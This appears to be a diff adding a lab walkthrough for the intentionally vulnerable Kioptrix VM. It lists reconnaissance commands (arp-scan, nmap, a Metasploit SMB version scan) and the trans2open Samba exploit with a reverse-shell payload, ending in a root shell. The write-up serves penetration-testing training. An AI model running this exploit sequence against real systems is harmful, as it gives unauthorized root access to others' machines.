@@ -1,0 +1,62 @@
+FOR DOING THIS PRACTICAL AT FIRST YOU HAVE TO DOWNLOAD KIOPTRIX ::
+
+DOWNLOAD LINK:
+https://drive.google.com/drive/folders/1iQf0vXvC-blCAbrpy4z6LAVatDF1xnNZ
+
+After that open that virtual machine in vmware .
+Then go to the folder where you have installed in your pc. you will find kioptrix VMware virtual machine configuration file open that file in Notepad.
+NOW search Bridged in notpad.
+change ethernet0.connectionType = "Bridged" to ethernet0.connectionType = "nat" other same and save this file.
+FINALLY Resume this virtual machine than only ip address will allocate in kali linux machine.
+
+PERFORMING PRACTICAL:
+
+====== STEP 1 =========
+
+ifconfig
+arp-scan -l
+nmap -sV -T4 192.168.91.137(ip address of vulnerable machine)
+msfconsole
+search smb_version
+use auxiliary/scanner/smb/smb_version
+show options
+set RHOSTS 192.168.91.137(ip address of vulnerable machine)
+show options
+run
+
+====== STEP 2 ========
+
+msfconsole
+search trans2open
+use exploit/linux/samba/trans2open
+set payload generic/shell_reverse_tcp
+show options
+set RHOSTS 192.168.91.137(ip address of vulnerable machine)
+show options
+exploit
+
+=========== RESULT =============
+
+pwd
+/tmp
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=99(nobody)
+ls
+touch Binod.txt
+ls
+Binod.txt
+mkdir Hackerboy
+ls
+Binod.txt
+Hackerboy
+
+========== OR DIRECT METHOD =====
+
+msf > msfconsole
+msf > search 2003-0201
+msf > use exploit/linux/samba/trans2open
+msf exploit(trans2open) > set rhost 192.168.80.132
+msf exploit(trans2open) > set payload generic/shell_reverse_tcp
+msf exploit(trans2open) > exploit
